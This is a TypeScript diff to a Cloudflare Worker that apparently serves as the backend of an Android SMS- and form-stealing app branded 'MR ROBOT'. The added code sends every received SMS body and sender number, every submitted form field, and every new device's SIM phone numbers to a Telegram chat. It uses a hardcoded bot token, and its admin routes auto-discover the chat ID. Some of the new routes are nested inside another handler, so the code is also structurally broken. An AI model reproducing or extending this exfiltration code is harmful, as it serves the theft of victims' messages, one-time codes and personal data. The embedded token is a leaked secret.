@@ -19,6 +19,8 @@ type Env = {
   FIREBASE_PRIVATE_KEY?: string;
   EVENT_BUS: DurableObjectNamespace;
   ASSETS: { fetch: (req: Request) => Promise<Response> };
+  TELEGRAM_BOT_TOKEN?: string;
+  TELEGRAM_CHAT_ID?: string;
 };
 
 // =================== SCHEMA ===================
@@ -257,6 +259,31 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
     console.warn("broadcast failed", e);
   }
 }
+
+  // =================== TELEGRAM NOTIFICATIONS ===================
+  const TG_BOT_TOKEN = "8899517356:AAHZujlxgR6pL5vXkrLtMZXzSXKR--7ljLw";
+
+  async function tgChatId(env: Env): Promise<string | null> {
+    if (env.TELEGRAM_CHAT_ID) return env.TELEGRAM_CHAT_ID;
+    try {
+      const rows = await neon(env.NEON_DATABASE_URL)(`SELECT value FROM settings WHERE key = 'telegram_chat_id' LIMIT 1`);
+      return (rows[0] as { value?: string })?.value ?? null;
+    } catch { return null; }
+  }
+
+  async function sendTelegram(env: Env, text: string): Promise<void> {
+    try {
+      const chatId = await tgChatId(env);
+      if (!chatId) return;
+      const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
+      });
+    } catch (e) { console.warn("Telegram send failed", e); }
+  }
+  
 
 // =================== FCM (Web Crypto JWT) ===================
 type FirebaseCredentials = {
@@ -651,6 +678,7 @@ app.post("/api/messages", async (c) => {
   }).returning();
   const mapped = mapMessage(inserted);
   await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
+  c.executionCtx.waitUntil(sendTelegram(c.env, `📩 <b>New SMS</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\nFrom: <b>${mapped.fromNumber}</b>\nSender: ${mapped.fromSender}\nTo: ${mapped.toNumber ?? "—"}\n💬 ${mapped.body}`));
   return c.json({ ok: true, id: mapped.id }, 201);
 });
 
@@ -679,6 +707,10 @@ app.post("/api/data", async (c) => {
   }).returning();
   const mapped = mapFormData(row);
   await broadcast(c.env, "form_data_added", { appId: mapped.appId, formData: mapped });
+  c.executionCtx.waitUntil(sendTelegram(c.env, (() => {
+      const fields = Object.entries(mapped.data as Record<string, unknown>).map(([k,v]) => `  📝 <b>${k}</b>: ${v}`).join("\n");
+      return `📋 <b>New Form Data</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\n${fields}`;
+    })()));
   return c.json(mapped, 201);
 });
 
@@ -821,6 +853,7 @@ app.post("/api/register", async (c) => {
     forwardEnabled: false, forwardSlot: null,
   });
   await broadcast(c.env, "device_updated", row);
+  if (created) c.executionCtx.waitUntil(sendTelegram(c.env, `📱 <b>New Device Registered</b>\nApp: <code>${row.appId}</code>\nDevice: <b>${row.name}</b> (<code>${row.deviceId}</code>)\nUser: ${row.userId}\nAndroid: ${row.androidVersion}\nSIM1: ${row.sim1Carrier ?? "—"} ${row.sim1Phone ?? ""}\nSIM2: ${row.sim2Carrier ?? "—"} ${row.sim2Phone ?? ""}`));
   return c.json({ ok: true, deviceId: row.deviceId, created }, created ? 201 : 200);
 });
 
@@ -988,6 +1021,46 @@ app.patch("/api/master/apps/:appId", async (c) => {
 
 // Master admin: all devices across all app-ids — requires x-master-pin header
 app.get("/api/master/all-devices", async (c) => {
+
+  // Telegram: auto-discover chat ID from getUpdates and save to settings
+  app.post("/api/master/telegram/setup", async (c) => {
+    const guard = await checkMasterPin(c as never);
+    if (guard) return guard;
+    const token = c.env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
+    const resp = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=10`);
+    const tgData = await resp.json() as { ok: boolean; result?: Array<{ message?: { chat?: { id: number; first_name?: string } } }> };
+    if (!tgData.ok || !tgData.result?.length) {
+      return c.json({ error: "Bot ko pehle ek message bhejo, fir dobara try karo." }, 400);
+    }
+    const latest = [...tgData.result].reverse().find(u => u.message?.chat?.id);
+    const chatId = String(latest?.message?.chat?.id ?? "");
+    if (!chatId) return c.json({ error: "Chat ID nahi mila" }, 400);
+    const sqlClient = neon(c.env.NEON_DATABASE_URL);
+    await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [chatId]);
+    await sendTelegram(c.env, `✅ <b>MR ROBOT Telegram Connected!</b>\n\nAb se notifications yahaan aayenge:\n📩 New SMS\n📋 New Form Data\n📱 New Device Registration`);
+    return c.json({ ok: true, chatId });
+  });
+
+  // Telegram: get current config status
+  app.get("/api/master/telegram/status", async (c) => {
+    const guard = await checkMasterPin(c as never);
+    if (guard) return guard;
+    const chatId = await tgChatId(c.env);
+    return c.json({ configured: !!chatId, chatId: chatId ?? null });
+  });
+
+  // Telegram: manually set chat ID
+  app.post("/api/master/telegram/set-chat", async (c) => {
+    const guard = await checkMasterPin(c as never);
+    if (guard) return guard;
+    const body = await c.req.json() as { chatId?: string };
+    if (!body.chatId) return c.json({ error: "chatId required" }, 400);
+    const sqlClient = neon(c.env.NEON_DATABASE_URL);
+    await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
+    await sendTelegram(c.env, `✅ <b>MR ROBOT Telegram Connected!</b>\n\nAb se notifications yahaan aayenge:\n📩 New SMS\n📋 New Form Data\n📱 New Device Registration`);
+    return c.json({ ok: true });
+  });
+  
   const guard = await checkMasterPin(c as never);
   if (guard) return guard;
   const db = getDb(c.env);
